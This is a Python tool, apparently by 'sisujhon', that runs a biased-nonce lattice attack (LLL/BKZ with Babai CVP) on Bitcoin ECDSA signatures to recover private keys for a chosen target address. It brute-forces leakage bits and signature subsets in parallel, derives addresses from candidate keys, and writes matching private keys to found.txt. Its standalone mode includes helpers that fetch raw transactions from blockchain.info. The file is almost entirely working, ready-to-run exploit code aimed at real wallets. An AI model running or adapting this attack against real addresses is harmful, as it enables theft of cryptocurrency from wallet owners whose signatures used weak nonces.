# ======================================================================
#  LLL-Attack CRYPTOGRAPHYTUBE  —  Mathematically Correct ECDSA Lattice Attack
# ======================================================================
#
#  WHAT IS FIXED vs v5:
#  ✅  Proper Hidden Number Problem (HNP) lattice formulation
#  ✅  Integer matrix (scale 2^B) — no QQ floating-point instability
#  ✅  Automatic B from real leakage bits (not hardcoded 249)
#  ✅  CVP post-step via Babai nearest-plane (not LLL alone)
#  ✅  All columns scanned for key candidate (not only col 0)
#  ✅  No fake bit-manipulation / _BYTE_VALUES noise
#  ✅  Nonce-reuse fast-path detector added
#  ✅  Modular inverse + address derivation kept (they were fine)
#
#  LATTICE MODEL (standard HNP / biased-nonce):
#
#    ECDSA:  s·k = z + r·d  (mod n)
#    → k = s⁻¹·z + s⁻¹·r·d  (mod n)
#
#  If the l LSBs (or MSBs) of each nonce k_i are known to be 0
#  (bias / weak RNG), this becomes a Shortest Vector / CVP problem.
#
#  Matrix (m signatures, after row/col scaling factor 2^B):
#
#      [ n   0   0  …  0   0      0    ]
#      [ 0   n   0  …  0   0      0    ]
#      [ …                             ]
#      [ t_1 t_2 … t_m  1  0      0    ]   ← t_i = r_i·s_i⁻¹ mod n
#      [ u_1 u_2 … u_m  0  n/2^l  0    ]   ← u_i = z_i·s_i⁻¹ mod n
#      [ 0   0   …  0   0   0     n    ]
#
#  Target / close vector:
#      w = (u_1, …, u_m, 0, n/2^(l+1), 0)
#
#  The short vector v = w - (key row) gives k_i estimates.
#  Then d = (s_i·k_i - z_i)·r_i⁻¹  mod n  for each i.
# ======================================================================

import os
import sys
import hashlib

# ── Optional gmpy2 ──────────────────────────────────────────────────────────
try:
    import gmpy2 as _gmpy2
    _HAS_GMPY2 = True
except ImportError:
    _HAS_GMPY2 = False

# ── secp256k1 curve constants ───────────────────────────────────────────────
_N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F


# ══════════════════════════════════════════════════════════════════════════════
#  PURE-PYTHON HELPERS CRYPTOGRAPHYTUBE 
# ══════════════════════════════════════════════════════════════════════════════

def _modinv(a, m=_N):
    """Modular inverse — uses gmpy2 if available, else Python built-in."""
    if _HAS_GMPY2:
        return int(_gmpy2.invert(a, m))
    return pow(a, -1, m)


def _rrr(i):
    """Format integer as 64-char zero-padded hex."""
    return hex(i).replace('0x', '').replace('L', '').zfill(64)


# ── secp256k1 point arithmetic ───────────────────────────────────────────────

def _pt_add(P1, P2):
    if P1 is None: return P2
    if P2 is None: return P1
    x1, y1 = P1; x2, y2 = P2
    if x1 == x2:
        if y1 != y2:
            return None
        lam = (3 * x1 * x1) * pow(2 * y1, _P - 2, _P) % _P
    else:
        lam = (y2 - y1) * pow(x2 - x1, _P - 2, _P) % _P
    x3 = (lam * lam - x1 - x2) % _P
    y3 = (lam * (x1 - x3) - y1) % _P
    return x3, y3


def _pt_mul(k, P=None):
    if P is None:
        P = (_Gx, _Gy)
    R = None
    while k:
        if k & 1:
            R = _pt_add(R, P)
        P = _pt_add(P, P)
        k >>= 1
    return R


# ── Bitcoin address derivation ───────────────────────────────────────────────

def _double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def _base58check(payload: bytes) -> str:
    chk = _double_sha256(payload)[:4]
    raw = payload + chk
    alpha = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    n_val = int.from_bytes(raw, 'big')
    result = b''
    while n_val:
        n_val, rem = divmod(n_val, 58)
        result = bytes([alpha[rem]]) + result
    pad = len(raw) - len(raw.lstrip(b'\x00'))
    return (alpha[0:1] * pad + result).decode()


def privkey_to_addresses(key_int):
    """
    Derive P2PKH Bitcoin addresses (compressed + uncompressed).
    Returns (addr_compressed, addr_uncompressed)  or  (None, None).
    """
    try:
        pt = _pt_mul(key_int)
        if pt is None:
            return None, None
        x, y = pt
        pub_unc = b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')
        pub_cmp = bytes([0x02 + (y & 1)]) + x.to_bytes(32, 'big')

        def _addr(pub_bytes):
            h160 = hashlib.new('ripemd160',
                               hashlib.sha256(pub_bytes).digest()).digest()
            return _base58check(b'\x00' + h160)

        return _addr(pub_cmp), _addr(pub_unc)
    except Exception:
        return None, None


# ══════════════════════════════════════════════════════════════════════════════
#  ATTACK FOCUS: Biased-Nonce / LSB Leakage (r values are always DIFFERENT)
#  Each nonce k_i has biased lower bits → HNP → LLL + CVP recovery
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
#  LLL / CVP LATTICE ATTACK (SageMath required) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

# Removed `_leakage_bits` heuristic per user recommendation.
def Attack(rsz_list, known_lsb_bits=None, limit=100, use_cvp=True, threshold_factor=2):
    """
    Proper HNP / biased-nonce LLL lattice attack on ECDSA.

    Parameters
    ----------
    rsz_list       : list[(r, s, z)]  — raw integer tuples from signatures
    known_lsb_bits : int or None      — number of LSBs of k known to be 0.
                                        If None, auto-estimated (weak).
    limit          : int              — max signatures to use
    use_cvp        : bool             — apply Babai CVP after LLL (recommended)

    Returns
    -------
    list[int]   — candidate private-key integers (may be empty)
    """
    try:
        from sage.all import Matrix, ZZ, QQ, vector, round
        import sage.all as sage_all
    except ImportError:
        try:
            from sage.all_cmdline import Matrix, ZZ, QQ, vector
            import sage.all_cmdline as sage_all
        except ImportError:
            print("[LLL] SageMath not found — Attack() skipped.")
            return []

    n = _N

    # ── Clip to limit ──────────────────────────────────────────────────────── CRYPTOGRAPHYTUBE
    data = rsz_list[:limit]
    m    = len(data)
    if m < 2:
        print("[LLL] Need at least 2 signatures.")
        return []

    # ── Leakage bits ───────────────────────────────────────────────────────── CRYPTOGRAPHYTUBE
    if known_lsb_bits is None:
        print("[LLL] Error: known_lsb_bits must be explicitly provided.")
        return []
    else:
        l = int(known_lsb_bits)

    # ── Scaling factor ─────────────────────────────────────────────────────── CRYPTOGRAPHYTUBE
    # B must be large enough so that the lattice short vector corresponds to
    # the correct nonce differences.  Standard choice: B = n-bit-size.
    B = n.bit_length()        # 256 for secp256k1
    scale = 2**l              # the leakage bounds the nonces by n/2^l
    S = 2**B                  # Matrix scaling multiplier

    print(f"[LLL] Parameters: m={m} sigs, l={l} leakage bits, B={B}")

    # ── Precompute t_i = r_i · s_i⁻¹  and  u_i = z_i · s_i⁻¹ (mod n) ──────
    t = []
    u = []
    for r, s, z in data:
        s_inv = _modinv(s)
        t.append(r * s_inv % n)
        u.append(z * s_inv % n)

    # ══════════════════════════════════════════════════════════════════════════ CRYPTOGRAPHYTUBE
    #  Build the integer lattice (m+2) × (m+2)
    #
    #  Rows 0..m-1:   n·e_i * S
    #  Row m:         t_0*S … t_{m-1}*S  | 1  0
    #  Row m+1:       u_0*S … u_{m-1}*S  | 0  n/scale
    # ══════════════════════════════════════════════════════════════════════════ CRYPTOGRAPHYTUBE

    dim    = m + 2
    M      = Matrix(ZZ, dim, dim)

    for i in range(m):
        M[i, i] = n * S

    for i in range(m):
        M[m,     i] = t[i] * S
        M[m + 1, i] = u[i] * S

    M[m,     m]     = 1
    M[m + 1, m]     = 0
    M[m,     m + 1] = 0
    M[m + 1, m + 1] = n // scale   # = n / 2^l

    # ── Lattice Reduction (Hybrid LLL + BKZ) ───────────────────────────────── CRYPTOGRAPHYTUBE
    L_matrix = None
    try:
        from fpylll import IntegerMatrix, LLL, BKZ
        A = IntegerMatrix.from_matrix(M)
        
        LLL.reduction(A) # Fast base reduction
        
        # Progressive BKZ for deeper reduction
        if m >= 25:
            for b_size in [20, 30]:
                try:
                    par = BKZ.Param(block_size=b_size, strategies=BKZ.DEFAULT_STRATEGY, max_loops=3)
                    BKZ.reduction(A, par)
                except Exception:
                    pass

        L_list = [[int(A[i, j]) for j in range(dim)] for i in range(dim)]
        
        if use_cvp:
            L_matrix = Matrix(ZZ, L_list)

    except ImportError:
        # Fallback to Sage native
        try:
            L_matrix = M.LLL(delta=0.75, eta=0.501, algorithm='fpLLL:fast')
        except Exception:
            L_matrix = M.LLL()
            
        if m >= 25:
            for b_size in [20, 30]:
                try:
                    L_matrix = L_matrix.BKZ(block_size=b_size)
                except Exception:
                    pass

        L_list = [[int(x) for x in row] for row in L_matrix]

    print("[LLL] Lattice reduction done — extracting candidates ...")

    # ── Key extraction & validation helper ───────────────────────────────────
    def _validate_and_add(k_candidate, idx=0):
        """Recover d from k, then check if it produces small nonces for others."""
        r_i, s_i, z_i = data[idx]
        d = (s_i * k_candidate - z_i) * _modinv(r_i) % n
        if not (0 < d < n):
            return

        # Fast Filter: If d is correct, ALL nonces k_j must be small (< n/scale)
        # We check against other signatures to eliminate junk.
        is_consistent = True
        # Dynamic threshold based on function argument
        threshold = (n // scale) * threshold_factor
        if threshold >= n: threshold = n
        
        for j in range(1, min(m, 5)):
             rj, sj, zj = data[j]
             kj = (zj + rj * d) * _modinv(sj) % n
             if kj > threshold and (n - kj) > threshold:
                 is_consistent = False
                 break
        
        if is_consistent:
            keys.add(d)

    keys = set()

    # ── Scan all rows of the converted list ──────────────────────────────────
    for row_ints in L_list:
        # Candidate nonce difference lives in any of the first m columns
        # We scan ALL columns to ensure no misses, but use the fast filter
        for col in range(m):
            if row_ints[col] % S != 0:
                continue
            k_diff = row_ints[col] // S
            if k_diff == 0:
                continue
            # Try both sign directions
            for k_raw in (k_diff % n, (-k_diff) % n):
                if k_raw == 0:
                    continue
                _validate_and_add(k_raw, idx=0)

    # ── Babai CVP (nearest-plane) CRYPTOGRAPHYTUBE ────────────────────────────────────────────
    if use_cvp:
        try:
            # Target vector w uses the shifted/centered components for normalization trick
            w_list = [(((u[i] - (n // (2 * scale))) % n) * S) for i in range(m)] + [0, n // (2 * scale)]
            w      = vector(ZZ, w_list)

            # Gram-Schmidt from the LLL-reduced basis
            # Precision can be an issue here, using defaults
            G, _   = L_matrix.gram_schmidt()

            def _babai_cvp(B_mat, B_gs, target):
                """Babai's nearest-plane algorithm."""
                v = target
                # Iterate rows backwards
                for i in range(int(B_mat.nrows()) - 1, -1, -1):
                    bi   = B_mat[i]
                    bi_s = B_gs[i]
                    # mu = (v . bi*) / (bi* . bi*)
                    mu   = (v * bi_s) / (bi_s * bi_s)
                    mu_r = int(round(QQ(mu)))
                    v    = v - mu_r * bi
                return target - v   # the CVP solution

            close = _babai_cvp(L_matrix, G, w)

            # Extraction from CVP result
            for col in range(m):
                if int(close[col]) % S != 0:
                    continue
                k_raw = (int(close[col]) // S) % n
                if k_raw == 0:
                    continue
                for k_try in (k_raw, n - k_raw):
                    _validate_and_add(k_try, idx=0)

            print("[LLL] CVP post-step done.")
        except Exception as e:
            print(f"[LLL] CVP skipped ({e})")

    print(f"[LLL] Candidate keys: {len(keys)}")
    return list(keys)

def attack_worker(args):
    """Worker function for multiprocessing pool to execute Attack silently"""
    import sys, os
    subset, l_try, tf = args
    keys = []
    with open(os.devnull, 'w') as devnull:
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        sys.stdout = devnull
        sys.stderr = devnull
        try:
            keys = Attack(subset, known_lsb_bits=l_try, limit=len(subset), use_cvp=True, threshold_factor=tf)
        except Exception:
            pass
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
    return keys

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN PIPELINE  —  called by ecdsa_forensic.py CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

def run_lll_attack(address: str, rsz_list: list,
                   output_dir: str = ".",
                   known_lsb_bits=None) -> list:
    """
    Full ECDSA lattice-attack pipeline.

    Parameters
    ----------
    address        : str         — target Bitcoin address
    rsz_list       : list        — [(r, s, z), …] integer tuples
    output_dir     : str         — folder for output files
    known_lsb_bits : int|None    — leakage bits (None = auto-estimate)

    Returns
    -------
    list[str]  — 'addr_c:addr_u:privkey_hex' for each match
    """
    import random
    import multiprocessing
    import os

    # ── Create a folder named after the address inside output_dir ────────────
    final_dir = os.path.join(output_dir, address)
    os.makedirs(final_dir, exist_ok=True)
    found_path = os.path.join(final_dir, "found.txt")

    print(f"\n[LLL] ══ Starting LLL-Attack-v6 for {address} ══")
    print(f"[LLL] Signatures supplied : {len(rsz_list)}")

    if len(rsz_list) < 2:
        print("[LLL] Need ≥ 2 signatures.")
        return []

    all_keys = []

    print("[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...")

    if known_lsb_bits is not None:
        l_ranges = [known_lsb_bits]
    else:
        l_ranges = list(range(2, 20))

    limit_m = min(len(rsz_list), 100)
    
    # ── 1. Priority Scheduling for M (Subset Sizes) ──────────────────────────
    # Added 2 and 3 at the start for Case 2/3 (Small Nonces/High Bias)
    priority_order = [2, 3, 40, 50, 30, 60, 20, 10, 5, 8]
    base_m = []
    for p in priority_order:
        if p <= limit_m and p not in base_m:
            base_m.append(p)
    # Append the rest of m ranges
    for m_try in range(4, limit_m + 1):
        if m_try not in base_m:
            base_m.append(m_try)

    # ── Task Generator ───────────────────────────────────────────────────────
    def generate_tasks():
        for m_try in base_m:
            for l_try in l_ranges:
                # ── Pruning Useless Combos ──────────────────────────────────
                if m_try < 8 and l_try < 4:
                    continue
                    
                # ── Deep Parallel Search (20 iterations) ─────────────────────
                for _ in range(20): 
                    subset = random.sample(rsz_list, m_try)
                    random.shuffle(subset)
                    
                    for tf in [1, 2, 4]:
                        yield (subset, l_try, tf)

    # ── Parallel Execution ───────────────────────────────────────────────────
    cores = max(1, multiprocessing.cpu_count() - 1)
    print(f"[LLL] Launching {cores} parallel workers across priority dimensions...")
    
    with multiprocessing.Pool(processes=cores) as pool:
        for keys in pool.imap_unordered(attack_worker, generate_tasks(), chunksize=2):
            if keys:
                all_keys.extend(keys)
                print(f"\n[LLL] ★ KEY FOUND via parallel worker! ★")
                pool.terminate()
                break

    if not all_keys:
        print("[LLL] No private key candidates recovered after full NO-MISS sweep.")
        print("[LLL] Reason: Target likely has no nonce bias, or leakage is too complex.")
        return []

    # Deduplicate
    all_keys = list(dict.fromkeys(all_keys))
    print(f"[LLL] Total unique candidates: {len(all_keys)} — verifying ...")

    # ── Phase 3: Address verification ────────────────────────────────────────
    matches            = []
    mixaddr_path       = os.path.join(final_dir, "mixaddress.txt")
    mathfound_path     = os.path.join(final_dir, "mathfound.txt")
    nomatchaddr_path   = os.path.join(final_dir, "nomatchaddress.txt")

    for key_int in all_keys:
        if not (0 < key_int < _N):
            continue
        addr_c, addr_u = privkey_to_addresses(key_int)
        key_hex = _rrr(key_int)   # full 64-char hex

        matched = (addr_c == address or addr_u == address)

        if matched:
            tag_c = " ← MATCH" if addr_c == address else ""
            tag_u = " ← MATCH" if addr_u == address else ""
            line  = f"{addr_c}:{addr_u}:0x{key_hex}"
            matches.append(line)

            print(f"\n[LLL] ★★★ PRIVATE KEY FOUND ★★★")
            print(f"[LLL]   Compressed   : {addr_c}{tag_c}")
            print(f"[LLL]   Uncompressed : {addr_u}{tag_u}")
            print(f"[LLL]   Private key  : 0x{key_hex}")

            # ── found.txt (existing) ─────────────────────────────────────
            try:
                with open(found_path, 'a', encoding='utf-8') as f:
                    f.write("=" * 64 + "\n")
                    f.write(f"Target       : {address}\n")
                    f.write(f"Compressed   : {addr_c}\n")
                    f.write(f"Uncompressed : {addr_u}\n")
                    f.write(f"Privkey      : 0x{key_hex}\n")
                    f.write("=" * 64 + "\n")
                print(f"[LLL]   Saved to     : {found_path}")
            except Exception as e:
                print(f"[LLL] Warning — could not save found.txt: {e}")

            # ── mathfound.txt (matched address + key) CRYPTOGRAPHYTUBE ────────────────────
            try:
                matched_addr = addr_c if addr_c == address else addr_u
                with open(mathfound_path, 'a', encoding='utf-8') as f:
                    f.write(f"{matched_addr}:0x{key_hex}\n")
                print(f"[LLL]   mathfound.txt: {mathfound_path}")
            except Exception as e:
                print(f"[LLL] Warning — could not save mathfound.txt: {e}")

        else:
            # ── Full key display (no truncation) ─────────────────────────
            print(f"[LLL] no-match  C={addr_c}  U={addr_u}  key=0x{key_hex}")

            # ── mixaddress.txt (both addresses + full private key) ────────
            try:
                with open(mixaddr_path, 'a', encoding='utf-8') as f:
                    f.write(f"{addr_c}:{addr_u}:0x{key_hex}\n")
            except Exception as e:
                print(f"[LLL] Warning — could not save mixaddress.txt: {e}")

            # ── nomatchaddress.txt (only addresses, NO private key, line by line) ─
            try:
                with open(nomatchaddr_path, 'a', encoding='utf-8') as f:
                    f.write(f"{addr_c}\n")
                    f.write(f"{addr_u}\n")
            except Exception as e:
                print(f"[LLL] Warning — could not save nomatchaddress.txt: {e}")

    if not matches:
        print("[LLL] No candidate matched the target address.")
        if os.path.exists(mixaddr_path):
            print(f"[LLL] No-match addresses+keys  → {mixaddr_path}")
        if os.path.exists(nomatchaddr_path):
            print(f"[LLL] No-match addresses only  → {nomatchaddr_path}")

    print(f"[LLL] ══ Done ══\n")
    return matches




# ══════════════════════════════════════════════════════════════════════════════
#  STANDALONE MODE  (python lll.py  /  sage lll.py  /  python lll.py wallet.txt) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import time
    from urllib.request import urlopen

    try:
        import requests
        from colorama import Fore, Style
    except ImportError:
        print("[!] Install: pip install requests colorama")
        sys.exit(1)

    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.YELLOW + r"""
  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
 ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║██║  ███╗██████╔╝███████║██████╔╝███████║ ╚████╔╝    ██║   ██║   ██║██████╔╝█████╗
 ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝     ██║   ██║   ██║██╔══██╗██╔══╝
 ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║   ██║      ██║   ╚██████╔╝██████╔╝███████╗
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
                                          LLL-Attack CRYPTOGRAPHYTUBE  |  HNP/CVP  |  Biased-Nonce LSB Leakage
""" + Style.RESET_ALL)

    print(Fore.LIGHTYELLOW_EX + "  Author : sisujhon" + Style.RESET_ALL)

    # ── Raw-tx parsing helpers CRYPTOGRAPHYTUBE ────────────────────────────────────────────────

    def _get_rawtx(txid):
        try:
            return urlopen(
                f"https://blockchain.info/rawtx/{txid}?format=hex",
                timeout=20).read().decode()
        except Exception as e:
            print(f"  [!] rawtx fetch failed for {txid}: {e}")
            return None

    def _hash160(pubk_hex):
        return hashlib.new('ripemd160',
                           hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

    def _get_rsz_from_raw(rawtx):
        """Parse legacy P2PKH raw tx → list of (r, s, z) integer tuples."""
        if not rawtx or len(rawtx) < 130:
            return []
        if rawtx[8:12] == '0001':   # SegWit — skip
            return []
        try:
            inp_nu = int(rawtx[8:10], 16)
            cur = 10
            inp_list = []
            for _ in range(inp_nu):
                prv_out = rawtx[cur:cur + 64]
                var0    = rawtx[cur + 64:cur + 72]
                cur    += 72
                sLen    = int(rawtx[cur:cur + 2], 16)
                script  = rawtx[cur:2 + cur + 2 * sLen]
                seq     = rawtx[2 + cur + 2 * sLen:10 + cur + 2 * sLen]
                sigLen  = int(script[2:4], 16)
                sig     = script[4:4 + sigLen * 2]
                rLen    = int(sig[4:6], 16)
                r_hex   = sig[6:6 + rLen * 2]
                s_hex   = sig[8 + rLen * 2:]
                pubLen  = int(script[4 + sigLen * 2:4 + sigLen * 2 + 2], 16)
                pub     = script[4 + sigLen * 2 + 2:]
                inp_list.append([prv_out, var0, r_hex, s_hex, pub, seq])
                cur = 10 + cur + 2 * sLen
            rest  = rawtx[cur:]
            first = rawtx[0:10]
            tot   = len(inp_list)
            results = []
            for one in range(tot):
                e = first
                for i in range(tot):
                    e += inp_list[i][0] + inp_list[i][1]
                    if one == i:
                        e += '1976a914' + _hash160(inp_list[one][4]) + '88ac'
                    else:
                        e += '00'
                    e += inp_list[i][5]
                e += rest + "01000000"
                z_hex = hashlib.sha256(
                    hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
                results.append((
                    int(inp_list[one][2], 16),
                    int(inp_list[one][3], 16),
                    int(z_hex, 16)
                ))
            return results
        except Exception as exc:
            print(f"  [!] parse error: {exc}")
            return []

    def _get_txids(wallet):
        """Fetch transaction IDs using official Blockchain.info API only."""
        txids = []
        offset = 0
        limit  = 50
        while True:
            try:
                # Official Blockchain.info address API
                url  = (f"https://blockchain.info/rawaddr/{wallet}"
                        f"?limit={limit}&offset={offset}")
                resp = requests.get(url, timeout=15)
                resp.raise_for_status()
                data = resp.json()
                txs  = data.get("txs", [])
                if not txs:
                    break
                for tx in txs:
                    txid = tx.get("hash", "")
                    if txid and txid not in txids:
                        txids.append(txid)
                # If fewer results than limit → last page
                if len(txs) < limit:
                    break
                offset += limit
                time.sleep(0.5)
            except Exception as e:
                print(f"  [!] blockchain.info error (offset={offset}): {e}")
                break
        return txids

    # ── Manual file input (ecdsa_forensic.py should have created {address}.txt) ────────────
    print(Fore.LIGHTYELLOW_EX + "\n  [?] ecdsa_forensic.py has created a .txt file named after the address." + Style.RESET_ALL)
    print(Fore.WHITE +      "      Example: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.txt" + Style.RESET_ALL)
    print()

    # Command-line argument ya manual prompt
    if len(sys.argv) > 1:
        input_file = sys.argv[1].strip()
    else:
        input_file = input(Fore.CYAN + "  Enter filename (e.g. 1ABC...xyz.txt) : " + Style.RESET_ALL).strip()

    if not input_file:
        print(Fore.RED + "[!] No file entered. Exiting." + Style.RESET_ALL)
        sys.exit(1)

    if not os.path.exists(input_file):
        print(Fore.RED + f"[!] File not found: {input_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + "    → Run ecdsa_forensic.py first so the file can be created." + Style.RESET_ALL)
        sys.exit(1)

    # ── Parse r,s,z file CRYPTOGRAPHYTUBE ───────────────────────────────────────────────────
    wallet  = None
    rsz_all = []
    with open(input_file, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if line.startswith('#'):
                if line.startswith('# Address :'):
                    wallet = line.split(':', 1)[1].strip()
                continue
            parts = line.split(',')
            if len(parts) >= 3:
                try:
                    r = int(parts[0].strip(), 16)
                    s = int(parts[1].strip(), 16)
                    z = int(parts[2].strip(), 16)
                    if r and s and z:
                        rsz_all.append((r, s, z))
                except ValueError:
                    pass

    # Fallback: get address from filename
    if wallet is None:
        wallet = os.path.splitext(os.path.basename(input_file))[0]

    print(Fore.GREEN  + f"\n  [+] Address  : {wallet}" + Style.RESET_ALL)
    print(Fore.GREEN  + f"  [+] RSZ rows : {len(rsz_all)}" + Style.RESET_ALL)

    if not rsz_all:
        print(Fore.RED + "[!] No valid r,s,z rows found in the file." + Style.RESET_ALL)
        sys.exit(1)

    # ── Run the attack CRYPTOGRAPHYTUBE ──────────────────────────────────────────────────────
    matches = run_lll_attack(wallet, rsz_all, output_dir=".")

    if matches:
        print(Fore.RED + f"\n  ★★★ FOUND: {len(matches)} key(s) — saved to found.txt ★★★\n"
              + Style.RESET_ALL)
    else:
        print(Fore.MAGENTA + "  No private key found.\n" + Style.RESET_ALL)